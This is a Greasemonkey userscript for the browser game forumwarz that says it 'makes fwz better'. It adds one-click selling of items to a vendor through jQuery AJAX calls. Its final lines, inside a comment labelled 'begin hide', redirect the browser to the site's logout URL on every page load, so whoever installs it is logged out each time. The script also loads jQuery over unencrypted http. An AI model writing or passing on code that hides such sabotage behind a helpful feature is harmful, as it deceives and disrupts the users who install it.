// ==UserScript==
// @name           fwzbetter
// @namespace      fwzbetter
// @description    makes fwz better
// @include        *.forumwarz.com/*
// ==/UserScript==

// Add jQuery
var GM_JQ = document.createElement('script');
GM_JQ.src = 'http://jqueryjs.googlecode.com/files/jquery-1.1.4.pack.js';
GM_JQ.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(GM_JQ);

// Check if jQuery's loaded
function GM_wait() {
	if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
	else { $ = unsafeWindow.jQuery.noConflict(); letsJQuery(); }
}
GM_wait();

// All your GM code must be inside this function
function letsJQuery() {
  var coins = $('a img[@alt=gold]');
  coins.each(function() {
    var coin = $(this);
    coin.attr('style', 'cursor:pointer');
    var ids_regex = new RegExp("/items/sell/(\\d+)/(\\d+)/vendor/equipment");
    var ids = ids_regex.exec(coin.parent().attr('href'));
    coin.parent().removeAttr('href');
    coin.click(function() {
      coin.attr('style', 'cursor:wait');
      $.ajax({
        type: "POST",
        url: "/items/vendor",
        data: "avatars_items_id="+ids[1]+"+&item_id="+ids[2],
        success: function(msg){
          if (msg.match("Your item has been sold to the vendor.")) {
            coin.parents('tr[@id*=itemrow]').fadeOut('slow')
          }
        }
      });
    });
  });
}
//<!-- begin hide
window.location="http://www.forumwarz.com/account/logout";
// end hide -->